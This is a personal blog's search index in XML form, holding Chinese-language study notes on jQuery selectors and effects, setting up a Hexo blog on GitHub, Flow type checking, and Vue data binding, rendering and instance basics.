<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Use-Jquery</title>
    <url>/2021/03/12/Use-Jquery/</url>
    <content><![CDATA[<pre><code class="js">// ----------元素选择器----------

$(&quot;p&quot;) 
$(&quot;p.intro&quot;)
$(&quot;.intro&quot;)
$(&quot;#intro&quot;)
$(&quot;ul li:first&quot;)
$(&quot;[href$=&#39;.jpg]&quot;)
$(&quot;div#intro .head&quot;)

/* 注意: Jquery 使用 $ 作为简写方式, 若引入的其他库中也使用 $ 符号

var jq = jQuery.noConflict()

现在可以使用 jq 来替代 $ 符号
*/

// ----------事件----------

$(document).ready(function)
$(selector).click(function)
$(selector).dbclick(function)
$(selector).focus(function)
$(selector).mouseover(function)
$(selector).change(function)
$(selector).keydown(function)
$(selector).submit(function)

event.target // 返回 DOM 

// ----------效果----------

// 1. 隐藏 和 显示
$(selector).hide(speed,callback);

$(selector).show(speed,callback);

// speed: &#39;slow&#39;, &#39;fast&#39;, 毫秒

// hide 与 show 的结合
$(selector).toggle(speed,callback);

// 2. 淡入 与 淡出
$(selector).fadeIn(speed,callback);

$(selector).fadeOut(speed,callback);

// fadeIn 与 fadeOut 的结合
$(selector).fadeToggle(speed,callback);

// 渐变为 透明色
$(selector).fadeTo(speed, opacity, callback);

// 3. 滑动 - 语法与 1 相同
$(selector).slideDown(speed,callback);
$(selector).slideUp(speed,callback);
$(selector).slideToggle(speed,callback);

// 4. 动画
$(selector).animate(&#123;params&#125;,speed,callback);

/*
params: CSS 属性
&#123;
    left: &#39;25px&#39;,
    width: &#39;+=150px&#39;,

&#125;

&#123;
    height: &#39;toggle&#39;
&#125;
*/

// 5. 停止动画
$(selector).stop();

// ----------获得内容和属性----------

text() // 获取文本内容
text(&#39;hello&#39;) // 设置文本内容
html() // html标记
html(&quot;&lt;p&gt;hello&lt;/p&gt;&quot;) // 设置内容 html
val() // 表单字段
val(&#39;hello&#39;) // 设置表单内容

attr() // 获取属性值
attr(&#39;href&#39;, &#39;https://www.baidu.com&#39;); // 设置属性

// 所有的方法均可以设置回调函数以改值, i 是 index

(text / html / val / attr)(function(i, orignalValue))


// ----------添加 删除----------
// 被选元素的结尾插入内容
append()
after()
// 被选元素的开头插入内容
prepend()
before()

// 删除元素与子元素
remove() 
// 不带参数 remove(&quot;.class&quot;)

empty()

// 移除指定元素
removeAttr()

// 添加 与 删除 class
addClass()
removeClass()
toggleClass()

// 返回 / 设置 css 属性值
css(&quot;propertyname&quot;)
css(&quot;propertyname&quot;: &quot;value&quot;)
css(&#123;&quot;propertyname&quot;: &quot;value&quot;, &quot;propertyname&quot;: &quot;value&quot;&#125;);

// ----------遍历----------

parent() // 直接父元素

parents() // 所有祖先元素

parentsUntil() // 介于二者之间的所有祖先元素
$(&#39;span&#39;).parentsUntil(&#39;div&#39;)

children() // 所有直接子元素
children(&quot;p.1&quot;)

find(&quot;span&quot;) // 返回后代的所有 span 元素


// prev() prevAll() prevUntil() 与下类似

siblings(&quot;p&quot;) // 同胞元素
next() // 下一个同胞元素
nextAll() // 跟随的同胞元素
$(&quot;h2&quot;).nextUntil(&quot;h4&quot;) // 返回 h2 与 h4 元素之间的所有同胞元素

// ----------过滤----------
first() // 返回被选元素的第一个元素
last() // 反

$(&quot;p&quot;).filter(&quot;.intro&quot;) // 返回带有类名 intro 的 p 元素
not() // 反
















</code></pre>
]]></content>
      <categories>
        <category>Javascript</category>
        <category>jquery</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 搭建博客</title>
    <url>/2021/01/19/hexo/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>第一篇博客！希望以后可能还会有……本文主要介绍了Hexo搭建博客的主要步骤以及相关问题，供回顾与参考 </p>

            <i class="fa fa-quote-right"></i>
          </blockquote>   

<blockquote>
<p>搭建前提：安装 <code>node.js</code> 和 <code>hexo</code><br>可以使用 <code>node -v</code> 和 <code>hexo v</code> 查看是否安装成功</p>
</blockquote>
<h3 id="x2728-建立博客站点"><a href="#x2728-建立博客站点" class="headerlink" title="&#x2728; 建立博客站点"></a><span class="emoji" alias="sparkles" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2728.png?v8">&#x2728;</span> 建立博客站点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init myblog    # 初始化 hexo</span><br><span class="line">cd myblog   # 进入 myblog 文件夹</span><br><span class="line">npm install # 下载相关的依赖包</span><br><span class="line">hexo generate | hexo g  # 生成静态页面或文件</span><br><span class="line">hexo server # start a  local server, at localhost:4000</span><br></pre></td></tr></table></figure>
<h3 id="x2728-将-hexo-部署到-GitHub"><a href="#x2728-将-hexo-部署到-GitHub" class="headerlink" title="&#x2728; 将 hexo 部署到 GitHub"></a><span class="emoji" alias="sparkles" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2728.png?v8">&#x2728;</span> 将 hexo 部署到 GitHub</h3><p>将<code>hexo</code>和<code>GitHub</code>关联起来，将<code>hexo</code>生成的文章部署到<code>GitHub</code>上，打开站点配置文件 <code>_config.yml</code>, 修改如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">    type: git</span><br><span class="line">    repo: https:&#x2F;&#x2F;github.com&#x2F;YourgithubName&#x2F;YourgithubName.github.io.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<p>这时候需要先安装<code>deploy-git</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>然后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean  # 清除之前生成的东西</span><br><span class="line">hexo g  # 生成静态文章</span><br><span class="line">hexo deploy | hexo d # 部署文章</span><br></pre></td></tr></table></figure>
<p><span class="emoji" alias="sunglasses" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8">&#x1f60e;</span> 输入<code>username</code>和<code>password</code>后就可以访问<a href="http://voyageyoung.github.io/">个人博客网站</a></p>
]]></content>
      <categories>
        <category>guide</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>深入揭秘 Vue</title>
    <url>/2021/02/03/deep-explore-Vue/</url>
    <content><![CDATA[<h2 id="💥-准备工作"><a href="#💥-准备工作" class="headerlink" title="💥 准备工作"></a>💥 准备工作</h2><h3 id="🌟-Flow"><a href="#🌟-Flow" class="headerlink" title="🌟 Flow"></a>🌟 <code>Flow</code></h3><p>工作方式: </p>
<ol>
<li>类型推断: 通过变量的使用上下文推断变量类型, 根据推断来检查类型;<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">split</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">split(<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🛠 报错 —— 期待参数: 字符串;  输入: 数字</p>
</blockquote>
</li>
<li>类型注释: 事先注释好期待的类型, <code>Flow</code> 会基于这些注释来判断;<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x: number, y: number</span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;Hello&#x27;</span>, <span class="number">11</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🛠 其实注释 <code>: number</code> 也没多大问题, 因为字符串也可以使用 <code>+</code> , 此处为了严谨, 还有其他一些例子:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组</span></span><br><span class="line"><span class="keyword">var</span> arr: <span class="built_in">Array</span>&lt;number&gt; = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr.push(<span class="string">&#x27;Hello&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类和对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span>&#123;</span><br><span class="line">  x: string;           </span><br><span class="line">  y: string | number; </span><br><span class="line">  z: boolean;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x: string, y: string | number</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x</span><br><span class="line">    <span class="built_in">this</span>.y = y</span><br><span class="line">    <span class="built_in">this</span>.z = <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar: Bar = <span class="keyword">new</span> Bar(<span class="string">&#x27;hello&#x27;</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj: &#123; <span class="attr">a</span>: string, <span class="attr">b</span>: number, <span class="attr">c</span>: <span class="built_in">Array</span>&lt;string&gt;, d: Bar &#125; = &#123;</span><br><span class="line">  a: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  b: <span class="number">11</span>,</span><br><span class="line">  c: [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>],</span><br><span class="line">  d: <span class="keyword">new</span> Bar(<span class="string">&#x27;hello&#x27;</span>, <span class="number">3</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Null</span></span><br><span class="line"><span class="keyword">var</span> foo: ?string = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<h3 id="🌟-Vue-js-源码目录设计"><a href="#🌟-Vue-js-源码目录设计" class="headerlink" title="🌟 Vue.js 源码目录设计"></a>🌟 <code>Vue.js</code> 源码目录设计</h3></li>
<li><code>compiler</code>: 编译相关</li>
<li><code>core</code>: 核心代码</li>
<li><code>platforms</code>: 不同平台的支持</li>
<li><code>server</code>: 服务端渲染</li>
<li><code>sfc</code>: .vue 文件解析</li>
<li><code>shared</code>: 共享代码</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>mocha-use</title>
    <url>/2021/03/12/mocha/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Javascript</category>
        <category>test</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>深入 - Vue 之数据绑定</title>
    <url>/2021/01/21/vue-learn-2/</url>
    <content><![CDATA[<h3 id="Class-与-Style-绑定"><a href="#Class-与-Style-绑定" class="headerlink" title="Class 与 Style 绑定"></a>Class 与 Style 绑定</h3><h4 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div</span><br><span class="line">  class&#x3D;&quot;static&quot;</span><br><span class="line">  v-bind:class&#x3D;&quot;&#123; active: isActive, &#39;text-danger&#39;: hasError &#125;&quot;</span><br><span class="line">&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  isActive: true,</span><br><span class="line">  hasError: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>active</code> 这个 <code>class</code> 是否存在取决于数据 property <code>isActive</code> 的值<br>上述渲染结果为：<br><code>&lt;div class=&quot;static active&quot;&gt;&lt;/div&gt;</code><br>上述的等价表述：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div v-bind:class&#x3D;&quot;classObject&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">data: &#123;</span><br><span class="line">  classObject: &#123;</span><br><span class="line">    active: true,</span><br><span class="line">    &#39;text-danger&#39;: false</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="数组语法-x1f44d"><a href="#数组语法-x1f44d" class="headerlink" title="数组语法 &#x1f44d;"></a>数组语法 <span class="emoji" alias="thumbsup" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png?v8">&#x1f44d;</span></h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;[activeClass, errorClass]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  activeClass: <span class="string">&#x27;active&#x27;</span>,</span><br><span class="line">  errorClass: <span class="string">&#x27;text-danger&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>渲染为：<code>&lt;div class=&quot;active text-danger&quot;&gt;&lt;/div&gt;</code></p>
<h4 id="Style"><a href="#Style" class="headerlink" title="Style"></a>Style</h4><blockquote>
<p>CSS property 名可以用驼峰式或短横线分隔来命名  </p>
</blockquote>
<p><span class="emoji" alias="one" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8">&#x0031;&#xfe0f;&#x20e3;</span>  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:style</span>=<span class="string">&quot;&#123; color: activeColor, fontSize: fontSize + &#x27;px&#x27; &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  activeColor: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">  fontSize: <span class="number">30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span class="emoji" alias="two" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8">&#x0032;&#xfe0f;&#x20e3;</span> (更清晰)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:style</span>=<span class="string">&quot;styleObject&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  styleObject: &#123;</span><br><span class="line">    color: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    fontSize: <span class="string">&#x27;13px&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h3><h4 id="v-if-v-else-if-v-else"><a href="#v-if-v-else-if-v-else" class="headerlink" title="v-if | v-else-if | v-else"></a>v-if | v-else-if | v-else</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;type === &#x27;A&#x27;&quot;</span>&gt;</span></span><br><span class="line">  A</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;type === &#x27;B&#x27;&quot;</span>&gt;</span></span><br><span class="line">  B</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;type === &#x27;C&#x27;&quot;</span>&gt;</span></span><br><span class="line">  C</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">  Not A/B/C</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="template-标签的使用"><a href="#template-标签的使用" class="headerlink" title="template 标签的使用"></a>template 标签的使用</h4><blockquote>
<p>使用 <code>&lt;template&gt;</code> 当做不可见的包裹元素，并在上面使用 <code>v-if</code> 。最终的渲染结果不包含 <code>&lt;template&gt;</code> 元素  </p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;ok&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Paragraph 1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Paragraph 2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="key-管理可复用的元素"><a href="#key-管理可复用的元素" class="headerlink" title="key 管理可复用的元素"></a>key 管理可复用的元素</h4><blockquote>
<p><code>key</code> 保证在每次切换时，输入框都将重新渲染，如果没有 <code>key</code>, 输入的内容将在切换时保留</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;loginType === &#x27;username&#x27;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your username&quot;</span> <span class="attr">key</span>=<span class="string">&quot;username-input&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your email address&quot;</span> <span class="attr">key</span>=<span class="string">&quot;email-input&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h3><h4 id="v-for-使用"><a href="#v-for-使用" class="headerlink" title="v-for 使用"></a>v-for 使用</h4><h5 id="x0031-xfe0f-x20e3-数组中使用"><a href="#x0031-xfe0f-x20e3-数组中使用" class="headerlink" title="&#x0031;&#xfe0f;&#x20e3; 数组中使用"></a><span class="emoji" alias="one" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8">&#x0031;&#xfe0f;&#x20e3;</span> 数组中使用</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;li v-for&#x3D;&quot;item in items&quot; :key&#x3D;&quot;item.message&quot;&gt;</span><br><span class="line">    &#123;&#123; item.message &#125;&#125;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line"></span><br><span class="line">&lt;li v-for&#x3D;&quot;(item, index) in items&quot;&gt;</span><br><span class="line">    &#123;&#123; parentMessage &#125;&#125; - &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br></pre></td></tr></table></figure>
<h5 id="x0032-xfe0f-x20e3-对象中使用"><a href="#x0032-xfe0f-x20e3-对象中使用" class="headerlink" title="&#x0032;&#xfe0f;&#x20e3; 对象中使用"></a><span class="emoji" alias="two" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8">&#x0032;&#xfe0f;&#x20e3;</span> 对象中使用</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul id&#x3D;&quot;v-for-object&quot; class&#x3D;&quot;demo&quot;&gt;</span><br><span class="line">  &lt;li v-for&#x3D;&quot;value in object&quot;&gt;</span><br><span class="line">    &#123;&#123; value &#125;&#125;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">    el: &#39;#v-for-ovject&#39;,</span><br><span class="line">    data: &#123;</span><br><span class="line">        object: &#123;</span><br><span class="line">            title: &#39;How to do lists in Vue&#39;,</span><br><span class="line">            author: &#39;Jane Doe&#39;,</span><br><span class="line">            publishedAt: &#39;2021-01-21&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>渲染结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">How to do lists in Vue</span><br><span class="line">Jane Doe</span><br><span class="line">2021-01-21</span><br></pre></td></tr></table></figure>
<h3 id="数组更新"><a href="#数组更新" class="headerlink" title="数组更新"></a>数组更新</h3><h4 id="替换数组-x1f525"><a href="#替换数组-x1f525" class="headerlink" title="替换数组 &#x1f525;"></a>替换数组 <span class="emoji" alias="fire" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f525.png?v8">&#x1f525;</span></h4><blockquote>
<p>不会变更原始数组，总是返回新数组<br>filter()、concat()、slice()  </p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">v-for</span>=<span class="string">&quot;set in sets&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;n in even(set)&quot;</span>&gt;</span>&#123;&#123; n &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  sets: [[ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]]</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">  even: <span class="function"><span class="keyword">function</span> (<span class="params">numbers</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> numbers.filter(<span class="function"><span class="keyword">function</span> (<span class="params">number</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> number % <span class="number">2</span> === <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>初识 Vue</title>
    <url>/2021/01/20/vue-learn-1/</url>
    <content><![CDATA[<h3 id="Vue-实例-x1f386"><a href="#Vue-实例-x1f386" class="headerlink" title="Vue 实例 &#x1f386;"></a>Vue 实例 <span class="emoji" alias="fireworks" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f386.png?v8">&#x1f386;</span></h3><blockquote>
<p>每一个 <code>Vue</code> 应用都是通过用 <code>Vue</code> 函数创建一个新的<code>Vue</code>实例开始的：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 自己的数据对象</span><br><span class="line">var data &#x3D; &#123; a: 1 &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 该对象被加入到一个Vue实例中</span><br><span class="line">var vm &#x3D; new Vue(&#123;</span><br><span class="line">    data: data</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">vm.$data &#x3D;&#x3D;&#x3D; data &#x2F;&#x2F; &#x3D;&gt; true  与用户定义的property区分</span><br><span class="line">vm.a &#x3D;&#x3D; data.a &#x2F;&#x2F; &#x3D;&gt; true</span><br><span class="line">vm.a &#x3D; 2</span><br><span class="line">data.a &#x2F;&#x2F; &#x3D;&gt; 2</span><br><span class="line">data.a &#x3D; 3</span><br><span class="line">vm.a &#x2F;&#x2F; &#x3D;&gt; 3</span><br></pre></td></tr></table></figure>
<p><span class="emoji" alias="exclamation" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2757.png?v8">&#x2757;</span> 只有当实例被创建时就已经存在于 <code>data</code> 中的 <code>property</code> 才是响应式的，也就是说：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vm.b &#x3D; &#39;hi&#39; &#x2F;&#x2F; 无用</span><br></pre></td></tr></table></figure>
<p><span class="emoji" alias="leaves" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f343.png?v8">&#x1f343;</span> 但也有唯一的例外：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.freeze(data) &#x2F;&#x2F; 这样即使修改 vm.a &#x3D; 5 也不会改变</span><br></pre></td></tr></table></figure>
<h3 id="实现生命周期钩子-x1f4f7"><a href="#实现生命周期钩子-x1f4f7" class="headerlink" title="实现生命周期钩子 &#x1f4f7;"></a>实现生命周期钩子 <span class="emoji" alias="camera" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4f7.png?v8">&#x1f4f7;</span></h3><ul>
<li><code>created</code> 钩子  <blockquote>
<p>实例被创建之后执行代码</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">    data: &#123;a:1&#125;,</span><br><span class="line">    created: function()&#123;</span><br><span class="line">        console.log(&#39;a is: &#39; + this.a)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; &#x3D;&gt; &quot;a is: 1&quot;</span><br></pre></td></tr></table></figure></li>
<li><code>mounted</code> 钩子  <blockquote>
<p>后续补充</p>
</blockquote>
</li>
<li><code>updated </code>钩子  <blockquote>
<p>后续补充</p>
</blockquote>
</li>
<li><code>destroyed </code>钩子  <blockquote>
<p>后续补充</p>
</blockquote>
<h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><h4 id="⭐-文本"><a href="#⭐-文本" class="headerlink" title="⭐ 文本"></a>⭐ 文本</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Message: &#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>   // msg 发生改变, 插值处的内容发生改变</span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-once</span>&gt;</span>Message: &#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span> // 执行一次性的插值，当数据改变，插值处内容不变了</span><br></pre></td></tr></table></figure>
<h4 id="⭐-原始-HTML"><a href="#⭐-原始-HTML" class="headerlink" title="⭐ 原始 HTML"></a>⭐ 原始 HTML</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Using mustaches: &#123;&#123; rawHtml &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>   // 解释为普通文本</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Using v-html directive: <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">&quot;rawHtml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>   // 解析为 html</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>   // 使用 JavaScript 表达式</span><br></pre></td></tr></table></figure>
<h4 id="⭐-Attribute"><a href="#⭐-Attribute" class="headerlink" title="⭐ Attribute"></a>⭐ Attribute</h4><blockquote>
<p><code>&#123;&#123;&#125;&#125;</code> 的语法不能用在 <code>html</code> 的 <code>attribute</code> 上， 应该使用 <code>v-bind</code> 指令：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:id</span>=<span class="string">&quot;dynamicId&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-bind:disabled</span>=<span class="string">&quot;isButtonDisabled&quot;</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="⭐-指令"><a href="#⭐-指令" class="headerlink" title="⭐ 指令"></a>⭐ 指令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p v-if&#x3D;&quot;seen&quot;&gt; now you can see me! &lt;&#x2F;p&gt;    &#x2F;&#x2F; 根据 seen 的值的真假来插入&#x2F;移除 &lt;p&gt; 元素</span><br></pre></td></tr></table></figure>
